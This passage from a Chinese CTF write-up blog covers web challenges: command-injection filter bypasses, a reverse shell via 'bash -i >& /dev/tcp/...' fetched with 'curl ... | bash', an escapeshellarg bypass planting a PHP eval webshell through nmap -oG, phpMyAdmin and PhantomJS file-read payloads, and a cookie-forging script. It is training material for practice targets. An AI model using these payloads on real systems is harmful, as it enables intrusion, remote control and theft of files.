class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">/?ip=</span><br><span class="line">/?ip=</span><br><span class="line">|\<span class="string">'|\"|\\|\(|\)|\[|\]|\&#123;|\&#125;/", $ip, $match))&#123;</span></span><br><span class="line"><span class="string">    echo preg_match("/\&amp;|\/|\?|\*|\&lt;|[\x&#123;00&#125;-\x&#123;20&#125;]|\&gt;|\'|\"|\\|\(|\)|\[|\]|\&#123;|\&#125;/", $ip, $match);</span></span><br><span class="line"><span class="string">    die("fxck your symbol!");</span></span><br><span class="line"><span class="string">  &#125; else if(preg_match("/ /", $ip))&#123;</span></span><br><span class="line"><span class="string">    die("fxck your space!");</span></span><br><span class="line"><span class="string">  &#125; else if(preg_match("/bash/", $ip))&#123;</span></span><br><span class="line"><span class="string">    die("fxck your bash!");</span></span><br><span class="line"><span class="string">  &#125; else if(preg_match("/.*f.*l.*a.*g.*/", $ip))&#123;</span></span><br><span class="line"><span class="string">    die("fxck your flag!");</span></span><br><span class="line"><span class="string">  &#125;</span></span><br><span class="line"><span class="string">  $a = shell_exec("ping -c 4 ".$ip);</span></span><br><span class="line"><span class="string">  echo "</span></span><br><span class="line"><span class="string">";</span></span><br><span class="line"><span class="string">  print_r($a);</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">?&gt;</span></span><br></pre></td></tr></table></figure><p>发现大多数符号都被过滤，以下几种方法都不行（不过好像都挺有用的，搬来学习一下）：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cat fl* 利用*匹配任意 不行</span><br><span class="line">echo "Y2F0IGZsYWcucGhw"| base64 -d | bash 也不行</span><br><span class="line">ca\t fl\ag.php 不行</span><br><span class="line">cat fl''ag.php 不行</span><br></pre></td></tr></table></figure><p>最后使用变量拼接：</p><p>顾名思义，变量拼接就是：a=f;b=lag.php;cat $a$b</p><p>利用到解题中：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a=g;cat$IFS$1fla$a.php</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/image-103.png" alt=""></p><p>[・_・?]</p><p>F12即可得出答案：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/image-104.png" alt=""></p><p>参考大佬原文：<a href="https://www.jianshu.com/p/fd7f9fcc9333" target="_blank" rel="noopener">ping</a></p><h3 id="BJDCTF-2nd—duangShell"><a href="#BJDCTF-2nd—duangShell" class="headerlink" title="BJDCTF-2nd—duangShell"></a>BJDCTF-2nd—duangShell</h3><p>首先首页提示</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/image-20200327192750978.png" alt=""></p><p>.swp源码泄露，是使用vim编辑器的缓存文件</p><p>于是访问<code>url/.index.php.swp</code>下载该文件，然后用<code>vim -r index.php.swp</code>恢复文件，得到源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=<span class="string">"en"</span>&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">"UTF-8"</span>&gt;</span><br><span class="line">    &lt;title&gt;give me a girl&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;center&gt;&lt;h1&gt;珍爱网&lt;/h1&gt;&lt;/center&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"how can i give you source code? .swp?!"</span>.<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_POST[<span class="string">'girl_friend'</span>])) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"where is P3rh4ps's girl friend ???"</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    $girl = $_POST[<span class="string">'girl_friend'</span>];</span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">'/\&gt;|\\\/'</span>, $girl)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'just girl'</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (preg_match(<span class="string">'/ls|phpinfo|cat|\%|\^|\~|base64|xxd|echo|\$/i'</span>, $girl)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;img src='img/p3_need_beautiful_gf.png'&gt; &lt;!-- He is p3 --&gt;"</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">//duangShell~~~~</span></span><br><span class="line">        exec($girl);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>代码审计，可以POST一个<code>girl_friend</code>参数但过滤了一些参数，看到最后执行命令使用的是<code>exec</code>的函数，返回最后一行内容，无回显，由于看不到输出，就选择反弹shell来拿到系统权限执行命令。</p><p>正好<code>curl</code>命令没用被禁，<a href="https://www.cnblogs.com/yanguhung/p/10115911.html" target="_blank" rel="noopener">curl命令参考</a>，于是选择用<code>curl</code>指令来curl远程主机上的文件然后再用管道符<code>| bash</code>来执行<code>curl</code>下来的内容</p><p>由于<code>buu</code>上面的靶机无法访问外网，创个小号开台可以用的靶机（靶机已经装好了LAMP），由于都是在一个内网，所以靶机之间可以互相访问</p><p><code>ssh</code>登录<code>ssh -p 29722 root@node3.buuoj.cn</code></p><p>输入密码进去后在<code>/var/www/html</code>目录下创建一个<code>txt</code>文件，里面写上反弹shell的语句</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/174.1.143.177/2333 0&gt;&amp;1</span><br></pre></td></tr></table></figure><p>注意上面的ip地址为内网的ip，提前用ifconfig查看一下内网ip就可以了，</p><p>然后在需要反弹shell的机子上post参数：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">girl_friend=curl 174.1.143.177/1.txt | bash</span><br></pre></td></tr></table></figure><p>可以看到shell被弹过来了，然后开始找flag</p><p>在根目录下有一个flag文件，但里面放的不是flag，于是find+grep查找</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find etc -name "*" | xargs grep "flag&#123;"</span><br></pre></td></tr></table></figure><p><a href="https://www.runoob.com/linux/linux-comm-xargs.html" target="_blank" rel="noopener">xargs</a>，最终在<code>etc</code>中找到了flag</p><p>关于反弹shell的解析参考以下文章</p><blockquote><p><a href="https://xz.aliyun.com/t/2548" target="_blank" rel="noopener">https://xz.aliyun.com/t/2548</a>   （Linux反弹shell（一）文件描述符与重定向）</p><p><a href="https://xz.aliyun.com/t/2549" target="_blank" rel="noopener">https://xz.aliyun.com/t/2549</a>   （Linux 反弹shell（二）反弹shell的本质）</p><p><a href="https://www.cnblogs.com/-zhong/p/11398877.html" target="_blank" rel="noopener">https://www.cnblogs.com/-zhong/p/11398877.html</a>   （Liunx反弹shell的几种方式）</p></blockquote><h3 id="BUUCTF-2018—Online-Tool"><a href="#BUUCTF-2018—Online-Tool" class="headerlink" title="BUUCTF-2018—Online Tool"></a>BUUCTF-2018—Online Tool</h3><p>首页源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_SERVER[<span class="string">'HTTP_X_FORWARDED_FOR'</span>])) &#123;</span><br><span class="line">    $_SERVER[<span class="string">'REMOTE_ADDR'</span>] = $_SERVER[<span class="string">'HTTP_X_FORWARDED_FOR'</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">'host'</span>])) &#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    $host = $_GET[<span class="string">'host'</span>];</span><br><span class="line">    $host = escapeshellarg($host);</span><br><span class="line">    $host = escapeshellcmd($host);</span><br><span class="line">    $sandbox = md5(<span class="string">"glzjin"</span>. $_SERVER[<span class="string">'REMOTE_ADDR'</span>]);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'you are in sandbox '</span>.$sandbox;</span><br><span class="line">    @mkdir($sandbox);</span><br><span class="line">    chdir($sandbox);</span><br><span class="line">    <span class="keyword">echo</span> system(<span class="string">"nmap -T5 -sT -Pn --host-timeout 2 -F "</span>.$host);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以<code>get</code>一个<code>host</code></p><ul><li><strong>escapeshellarg</strong>：将给字符串增加一个单引号并且能引用或者转码任何已经存在的单引号</li><li><strong>escapeshellcmd</strong>：对字符串中可能会欺骗 shell 命令执行任意命令的字符进行转义，反斜线（\）会在以下字符之前插入： <em>&amp;#;`|\</em>?~&lt;&gt;^()[]{}$*, <em>\x0A<em>和 *\xFF</em>。<code>&#39;</code>和<code>&quot;</code> 仅在不配对儿的时候被转义。 在 Windows 平台上，所有这些字符以及 *%</em> 和 <em>!</em> 字符都会被空格代替。</li></ul><p>假设传入<code>172.17.0.2&#39; aaa</code>，结果<code>escapeshellarg</code>处理后变成了<code>&#39;172.17.0.2&#39;\&#39;&#39; aaa&#39;</code>,在单引号前加了一个反斜杠转义，然后又将转义后单引号两边的字符串用引号引起来起到连接字符串的作用，随后经过<code>escapeshellcmd</code>处理变成了<code>&#39;172.17.0.2&#39;\\&#39;&#39; aaa&#39;</code>，<code>\\</code>被解释为<code>\</code>而不再是转义字符，所以后面的<code>&#39;</code>没有被转义，后面的<code>&#39;</code>配对成了一个空白连接符，如果是<code>ping</code>命令，则命令简化成了<code>ping 172.17.0.2\ aaa&#39;</code>，最终就会造成利用</p><p>于是我们配合<code>nmap</code>的<code>-oG</code>参数可以将扫描的结果生成指定的文件</p><p><code>payload</code>：<code>?host=&#39; &lt;?php @eval($_POST[&quot;hack&quot;]);?&gt; -oG hack.php &#39;</code></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF题 </tag>
            
            <tag> 命令注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE</title>
      <link href="/2020/03/03/CVE/"/>
      <url>/2020/03/03/CVE/</url>
      
        <content type="html"><![CDATA[<h3 id="2019GWCTF—我有一个数据库"><a href="#2019GWCTF—我有一个数据库" class="headerlink" title="2019GWCTF—我有一个数据库"></a>2019GWCTF—我有一个数据库</h3><p>核心—————–phpmyadmin[CVE-2018-12613]</p><p>利用dirb扫到phpmyadmin后台</p><p>利用该漏洞可进行任意文件读取</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?target=db_sql.php%<span class="number">253</span>f/../../../../../../etc/passwd</span><br><span class="line"></span><br><span class="line">?target=db_sql.php%<span class="number">253</span>f/../../../../../../flag</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/CVE/image-179.png" alt=""></p><p>漏洞复现介绍与利用：</p><ul><li>首发：<a href="https://mp.weixin.qq.com/s?__biz=MzIzMTc1MjExOQ==&mid=2247485036&idx=1&sn=8e9647906c5d94f72564dec5bc51a2ab&chksm=e89e2eb4dfe9a7a28bff2efebb5b2723782dab660acff074c3f18c9e7dca924abdf3da618fb4&mpshare=1&scene=1&srcid=0621gAv1FMtrgoahD01psMZr&pass_ticket=LqhRfckPxAVG2dF%2FjxV%2F9%2FcEb5pShRgewJe%2FttJn2gIlIyGF%2FbsgGmzcbsV%2BLmMK#rd" target="_blank" rel="noopener">ChaMd5安全团队</a></li><li>大专栏：<a href="https://www.dazhuanlan.com/2019/09/28/5d8ebdd8af9b2/" target="_blank" rel="noopener">https://www.dazhuanlan.com/2019/09/28/5d8ebdd8af9b2/</a></li><li>Freebuf：<a href="https://www.freebuf.com/column/207707.html" target="_blank" rel="noopener">https://www.freebuf.com/column/207707.html</a></li></ul><h3 id="WEB-RemoteImageDownloader"><a href="#WEB-RemoteImageDownloader" class="headerlink" title="WEB_RemoteImageDownloader"></a>WEB_RemoteImageDownloader</h3><p>核心—————–PhantomJS任意文件读取[CVE-2019-17221]</p><p><a href="https://web.archive.org/web/20191220171022/https://www.darkmatter.ae/blogs/breaching-the-perimeter-phantomjs-arbitrary-file-read/" target="_blank" rel="noopener">Breaching the perimeter – PhantomJs Arbitrary file read</a></p><p>界面：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E6%80%9D%E7%BB%B4%E5%AF%BC%E5%9B%BE%E6%94%B6%E9%9B%86/image-20200506121650092.png" alt=""></p><p>POC</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span> </span><br><span class="line"> <span class="tag">&lt;<span class="name">head</span>&gt;</span> </span><br><span class="line"> <span class="tag">&lt;<span class="name">body</span>&gt;</span> </span><br><span class="line"> <span class="tag">&lt;<span class="name">script</span>&gt;</span> </span><br><span class="line"><span class="actionscript"> x=<span class="keyword">new</span> XMLHttpRequest; </span></span><br><span class="line"><span class="actionscript"> x.onload=<span class="function"><span class="keyword">function</span><span class="params">()</span></span>&#123; </span></span><br><span class="line"><span class="javascript"> <span class="built_in">document</span>.write(<span class="keyword">this</span>.responseText) </span></span><br><span class="line"> &#125;; </span><br><span class="line"><span class="actionscript"> x.open(<span class="string">"GET"</span>,<span class="string">"file:///flag"</span>); </span></span><br><span class="line"> x.send(); </span><br><span class="line"> <span class="tag">&lt;/<span class="name">script</span>&gt;</span> </span><br><span class="line"> <span class="tag">&lt;/<span class="name">body</span>&gt;</span> </span><br><span class="line"> <span class="tag">&lt;/<span class="name">head</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>将html保存到自己的公网ip上，然后题目界面下载即可，最后得到flag的图片</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF题 </tag>
            
            <tag> CVE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>其它</title>
      <link href="/2020/03/01/%E5%85%B6%E5%AE%83/"/>
      <url>/2020/03/01/%E5%85%B6%E5%AE%83/</url>
      
        <content type="html"><![CDATA[<h1 id="其它"><a href="#其它" class="headerlink" title="其它"></a>其它</h1><h2 id="百度杯九月场Code"><a href="#百度杯九月场Code" class="headerlink" title="百度杯九月场Code"></a>百度杯九月场Code</h2><p>界面：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%85%B6%E5%AE%83/image-20200219214921326.png" alt=""></p><p>url：<code>http://b5efa69caacc45bd9bec859e429e8bbb89f97fd4cf5543c9.changame.ichunqiu.com/index.php?jpg=hei.jpg</code>，查看源码：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%85%B6%E5%AE%83/image-20200219215138731.png" alt=""></p><p>猜测存在文件包含读取文件操作，于是访问<code>http://b5efa69caacc45bd9bec859e429e8bbb89f97fd4cf5543c9.changame.ichunqiu.com/index.php?jpg=index.php</code>查看源码：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%85%B6%E5%AE%83/image-20200219215307566.png" alt=""></p><p>base64解密后得到index.php的源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by PhpStorm.</span></span><br><span class="line"><span class="comment"> * Date: 2015/11/16</span></span><br><span class="line"><span class="comment"> * Time: 1:31</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">header(<span class="string">'content-type:text/html;charset=utf-8'</span>);</span><br><span class="line"><span class="keyword">if</span>(! <span class="keyword">isset</span>($_GET[<span class="string">'jpg'</span>]))</span><br><span class="line">    header(<span class="string">'Refresh:0;url=./index.php?jpg=hei.jpg'</span>);</span><br><span class="line">$file = $_GET[<span class="string">'jpg'</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;title&gt;file:'</span>.$file.<span class="string">'&lt;/title&gt;'</span>;</span><br><span class="line">$file = preg_replace(<span class="string">"/[^a-zA-Z0-9.]+/"</span>,<span class="string">""</span>, $file);</span><br><span class="line">$file = str_replace(<span class="string">"config"</span>,<span class="string">"_"</span>, $file);</span><br><span class="line">$txt = base64_encode(file_get_contents($file));</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;img src='data:image/gif;base64,"</span>.$txt.<span class="string">"'&gt;&lt;/img&gt;"</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Can you find the flag file?</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>注意注释里的这话句<code>Created by PhpStorm</code>，是用<code>PhpStorm</code>编辑器写的，用这个编辑器写的工程文件下会有一个<code>.idea</code>文件夹，<a href="https://segmentfault.com/q/1010000008644646" target="_blank" rel="noopener">详</a>，类似于这个项目的根目录文件，里面包含了一些xml文件（配置）。</p><p>于是访问<code>http://b5efa69caacc45bd9bec859e429e8bbb89f97fd4cf5543c9.changame.ichunqiu.com/.idea/workspace.xml</code>得到一个xml页面，提取其中有用信息</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%85%B6%E5%AE%83/image-20200219220208401.png" alt=""></p><p>结合<code>index.php</code>的源码利用<code>config</code>代替<code>_</code>，于是访问<code>http://b5efa69caacc45bd9bec859e429e8bbb89f97fd4cf5543c9.changame.ichunqiu.com/index.php?jpg=fl3gconfigichuqiu.php</code>得到<code>fl3g_ichuqiu.php</code>的源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by PhpStorm.</span></span><br><span class="line"><span class="comment"> * Date: 2015/11/16</span></span><br><span class="line"><span class="comment"> * Time: 1:31</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">error_reporting(E_ALL || ~E_NOTICE);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">'config.php'</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">random</span><span class="params">($length, $chars = <span class="string">'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcdefghijklmnopqrstuvwxyz'</span>)</span> </span>&#123;</span><br><span class="line">    $hash = <span class="string">''</span>;</span><br><span class="line">    $max = strlen($chars) - <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; $length; $i++)&#123;</span><br><span class="line">        $hash .= $chars[mt_rand(<span class="number">0</span>, $max)];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $hash;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">encrypt</span><span class="params">($txt,$key)</span></span>&#123;</span><br><span class="line">    <span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;strlen($txt);$i++)&#123;</span><br><span class="line">        $tmp .= chr(ord($txt[$i])+<span class="number">10</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    $txt = $tmp;</span><br><span class="line">    $rnd=random(<span class="number">4</span>);</span><br><span class="line">    $key=md5($rnd.$key);</span><br><span class="line">    $s=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;strlen($txt);$i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>($s == <span class="number">32</span>) $s = <span class="number">0</span>;</span><br><span class="line">        $ttmp .= $txt[$i] ^ $key[++$s];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> base64_encode($rnd.$ttmp);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">decrypt</span><span class="params">($txt,$key)</span></span>&#123;</span><br><span class="line">    $txt=base64_decode($txt);</span><br><span class="line">    $rnd = substr($txt,<span class="number">0</span>,<span class="number">4</span>);</span><br><span class="line">    $txt = substr($txt,<span class="number">4</span>);</span><br><span class="line">    $key=md5($rnd.$key);</span><br><span class="line"></span><br><span class="line">    $s=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;strlen($txt);$i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>($s == <span class="number">32</span>) $s = <span class="number">0</span>;</span><br><span class="line">        $tmp .= $txt[$i]^$key[++$s];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;strlen($tmp);$i++)&#123;</span><br><span class="line">        $tmp1 .= chr(ord($tmp[$i])<span class="number">-10</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $tmp1;</span><br><span class="line">&#125;</span><br><span class="line">$username = decrypt($_COOKIE[<span class="string">'user'</span>],$key);</span><br><span class="line"><span class="keyword">if</span> ($username == <span class="string">'system'</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> $flag;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    setcookie(<span class="string">'user'</span>,encrypt(<span class="string">'guest'</span>,$key));</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"╮(╯▽╰)╭"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>发现分别有一个加密函数，一个解密函数，分析php代码；</p><p>当传入<code>cookie</code>中的<code>user</code>的值经过<code>decrypt</code>函数后返回的值为<code>system</code>，就可以得到flag，所以我们需要得到一串base64码，这一串base64经过<code>decrypt</code>函数能解出<code>system</code>，于是</p><p>由<code>guest</code>可以逆推出<code>rnd</code>的值和md5加密后<code>key</code>值的前5位；</p><p>再由<code>key</code>的前5位得出所有前6位可能的值，再通过<code>decrypt</code>函数逆推出函数中<code>$txt</code>值的后6位，再在前面加上<code>$rnd</code>的值经过base64加密后得到的16个可能的<code>user</code>值，再拿16个值去bp进行爆破，即可得到flag</p><p>写出解密脚本，得到<code>rnd</code>和md5加密后的<code>key</code>值</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">session = <span class="string">'OFZhSEdLVxga'</span><span class="comment">#本地user值</span></span><br><span class="line">txt = base64.b64decode(session.encode()).decode()</span><br><span class="line">rnd = txt[<span class="number">0</span>:<span class="number">4</span>]   <span class="comment">#拿到rnd的值</span></span><br><span class="line">ttemp = txt[<span class="number">4</span>:]</span><br><span class="line">guest = <span class="string">'guest'</span></span><br><span class="line">tmp = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(guest)):</span><br><span class="line">    tmp += chr(ord(guest[i]) + <span class="number">10</span>)</span><br><span class="line">key = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(ttemp)):</span><br><span class="line">    key += chr(ord(tmp[i]) ^ ord(ttemp[i]))<span class="comment">#拿到key</span></span><br><span class="line">system = <span class="string">'system'</span></span><br><span class="line">system1 = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(system)):</span><br><span class="line">    system1 += chr(ord(system[i]) + <span class="number">10</span>)</span><br><span class="line">md5 = <span class="string">'0123456789abcdef'</span><span class="comment">#经过md5加密后的每一位数都是0-f之间的数</span></span><br><span class="line">key_new = <span class="string">''</span></span><br><span class="line">cookie_new = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(md5)): <span class="comment">#循环出所有可能的结果</span></span><br><span class="line">    key_new  = key + md5[i]</span><br><span class="line">    session_new = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(len(system1)):</span><br><span class="line">        session_new += chr(ord(key_new[j]) ^ ord(system1[j]))</span><br><span class="line">    session_new = rnd + session_new</span><br><span class="line">    cookie_new = base64.b64encode(session_new.encode()).decode()</span><br><span class="line">    